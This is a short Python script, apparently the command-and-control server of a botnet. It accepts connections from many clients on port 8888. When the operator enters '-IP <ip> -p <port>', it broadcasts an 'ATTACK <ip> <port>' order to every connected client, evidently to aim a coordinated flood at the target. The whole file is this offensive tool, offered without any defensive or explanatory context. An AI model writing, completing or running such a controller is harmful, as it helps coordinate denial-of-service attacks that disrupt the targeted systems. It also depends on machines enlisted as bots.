import socket
import threading

clients = []

def handle_client(conn, addr):
    clients.append(conn)
    print(f"Client connected: {addr}")

def server_handler(host, port):
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.bind((host, port))
        s.listen(5)
        print("Server listening...")
        while True:
            conn, addr = s.accept()
            threading.Thread(target=handle_client, args=(conn, addr)).start()

def send_attack_command(ip, port):
    for client in clients:
        try:
            command = f"ATTACK {ip} {port}"
            client.sendall(command.encode('utf-8'))
        except Exception as e:
            print(f"Error sending attack command: {e}")

if __name__ == "__main__":
    server_ip = "0.0.0.0"  # استخدم "0.0.0.0" لاستقبال جميع الاتصالات الواردة
    server_port = 8888

    threading.Thread(target=server_handler, args=(server_ip, server_port)).start()

    while True:
        command = input("Enter command (-IP <ip> -p <port>): ")
        if command.startswith("-IP"):
            _, ip, _, port = command.split()
            send_attack_command(ip, int(port))
            print("Attack command sent.")